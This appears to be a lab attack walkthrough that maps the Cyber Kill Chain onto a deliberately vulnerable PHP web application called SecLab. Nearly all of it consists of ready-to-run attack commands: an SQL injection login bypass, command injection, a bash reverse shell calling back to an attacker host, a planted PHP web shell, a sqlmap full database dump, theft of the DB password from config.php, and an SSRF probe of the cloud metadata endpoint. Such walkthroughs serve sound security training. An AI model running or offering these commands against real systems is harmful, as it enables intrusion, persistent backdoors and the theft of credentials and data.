# Cyber Kill Chain Analysis: SecLab Web Application

This document maps an attacker's methodology against the `seclab_web_app` target architecture based on the Lockheed Martin Cyber Kill Chain. It includes specific, actionable commands leveraging the documented vulnerabilities of the web application.

> **Note:** Replace `<TARGET_IP>` with the IP or hostname of the deployed SecLab Web App environment and `<ATTACKER_IP>` with the attacker machine's IP.

---

## 1. Reconnaissance
*Gathering information about the target to identify weaknesses, entry points, and underlying technologies.*

**Action 1: Port & Service Discovery**
Discovering open ports and services running on the web server.
```bash
nmap -sC -sV -p- 192.168.0.47
```

**Action 2: Directory Fuzzing & Enumeration**
Finding hidden directories. This quickly reveals the unprotected `/admin` folder and API endpoints.
We will use our customized target wordlist for more accurate discovery.
```bash
gobuster dir -u http://192.168.0.47/ -w ./fuzzer_wordlist.txt
```

**Action 3: Information Disclosure (Dependencies)**
Fetching `composer.json` exposed in the web root to fingerprint exact backend library versions for public CVE mapping.
```bash
curl -s http://<TARGET_IP>/composer.json | jq
```

---

## 2. Weaponization
*Crafting payloads designed specifically for the vulnerabilities discovered during reconnaissance.*

**Action 1: SQL Injection Payloads**
Crafting a payload for `index.php` login to bypass authentication.
*   **Payload:** `admin@test.com' OR '1'='1`

**Action 2: Reverse Shell Payload**
Crafting an RCE shell payload for `diagnostic.php` to provide terminal access to the attacker.
*   **Payload:** `; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' &`

**Action 3: Cookie Tampering Payload**
Generating the local browser parameters required to exploit broken privilege management.
*   **Payload:** `user_role=admin`

---

## 3. Delivery
*Transmitting the weaponized payloads to the targeted web application via HTTP methods (GET/POST).*

**Action 1: Delivering Broken Access Control (Forced Browsing)**
Directly accessing the unauthenticated administrator console via a web browser.
```bash
# Simply navigating to the URL:
firefox http://<TARGET_IP>/admin/admin.php
```

**Action 2: Excessive Data Exposure via GraphQL API Delivery**
Sending an introspective POST request to map GraphQL backend schema/passwords.
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ accountByName(name: \"admin\") { id password_hash } }"}' \
  http://<TARGET_IP>/api/v2/graphql.php
```

---

## 4. Exploitation
*Triggering the vulnerabilities within the web application to achieve unauthorized access or behavior.*

**Action 1: Authentication Bypass (SQLi)**
Sending the malicious SQL payload directly inside the POST request body of `index.php`.
```bash
curl -X POST -d "email=admin@test.com' OR '1'='1&password=NOPASSWORD" http://<TARGET_IP>/index.php -c cookies.txt
```

**Action 2: Privilege Escalation**
Exploiting the insecure cookie validation by injecting an administrative cookie into the session.
```bash
curl --cookie "user_role=admin" http://<TARGET_IP>/admin/categories.php
```

**Action 3: Remote Command Execution (RCE)**
Executing system-level commands through the vulnerable `admin/diagnostic.php` input field.
```bash
curl "http://<TARGET_IP>/admin/diagnostic.php?ip=127.0.0.1;id;whoami"
```

---

## 5. Installation
*Establishing prolonged persistence inside the infrastructure so the attacker survives reboots or password changes.*

**Action 1: Dropping a Minimal PHP Web Shell**
Using the RCE vulnerability to write a backdoor (`shell.php`) directly into the public web root (`/var/www/html`).
```bash
curl -G --data-urlencode "ip=127.0.0.1; echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php" "http://<TARGET_IP>/admin/diagnostic.php"
```

**Action 2: Verifying the Backdoor**
Checking that the web shell successfully dropped and successfully executes commands.
```bash
curl "http://<TARGET_IP>/shell.php?cmd=hostname"
```

---

## 6. Command and Control (C2)
*Opening an operational channel from the compromised server back to the attacker's machine.*

**Action 1: Setting up an empty listener (Attacker Machine)**
Listening on port 4444 to catch the incoming shell from the target.
```bash
nc -lvnp 4444
```

**Action 2: Calling Back (Target Web App)**
Using our dropped web shell (`shell.php`) to execute the weaponized reverse shell payload.
```bash
curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' &" "http://<TARGET_IP>/shell.php"
```
*(The attacker's netcat listener will now drop into an interactive server shell).*

---

## 7. Actions on Objectives
*Reaching the final goal: Exfiltration of databases, lateral movement, or defacement.*

**Action 1: Automated Database Dumping**
Using SQLMap against the vulnerable API endpoints located in `api/v1/index.php` to mass-exfiltrate database credentials and user tables.
```bash
sqlmap -u "http://<TARGET_IP>/api/v1/index.php?id=1" --batch --dbs --dump-all
```

**Action 2: Source Code Exfiltration**
Downloading backend configuration files like `config.php` sequentially by utilizing the C2 shell to obtain database passphrases.
```bash
cat /var/www/html/config.php | grep "DB_PASS"
```

**Action 3: Server-Side Request Forgery Architecture Mapping**
Exploiting `profile.php`'s SSRF vulnerability to bypass the firewall and probe the internal DMZ or AWS Metadata Service.
```bash
curl -X POST -d "avatar_url=http://169.254.169.254/latest/meta-data/" \
  http://<TARGET_IP>/profile.php
```
